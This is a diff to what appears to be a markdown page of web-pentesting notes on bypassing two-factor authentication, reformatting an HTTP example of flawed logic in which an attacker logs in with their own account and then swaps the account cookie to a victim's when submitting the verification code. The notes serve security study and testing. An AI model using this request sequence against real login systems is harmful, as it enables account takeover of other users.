@@ -36,27 +36,33 @@
   * Check if you can directly skip to "logged-in" pages. Sometimes the webapp doesn't check whether or not you completed the second step.
 * Flawed logic
 
-<pre class="language-http"><code class="lang-http"><strong># 1 step - Normal login with attacker account
+<pre class="language-http"><code class="lang-http"><strong># 1.1 step - Normal login with attacker account
 </strong>POST /login-steps/first HTTP/1.1
 Host: vulnerable-website.com
 [...]
 username=carlos&#x26;password=qwerty
+</code></pre>
 
-# 1 step - The server sets cookie
+```http
+# 1.2 step - The server sets cookie
 HTTP/1.1 200 OK
 Set-Cookie: account=carlos
+```
 
+```http
 # 2 step - request two-factor
 GET /login-steps/second HTTP/1.1
 Cookie: account=carlos
+```
 
+```http
 # 3 step - submit the two-factor code with victim cookie
 POST /login-steps/second HTTP/1.1
 Host: vulnerable-website.com
 Cookie: account=victim-user
 ...
 verification-code=123456
-</code></pre>
+```
 
 ## <mark style="color:yellow;">Remember me option</mark>
 
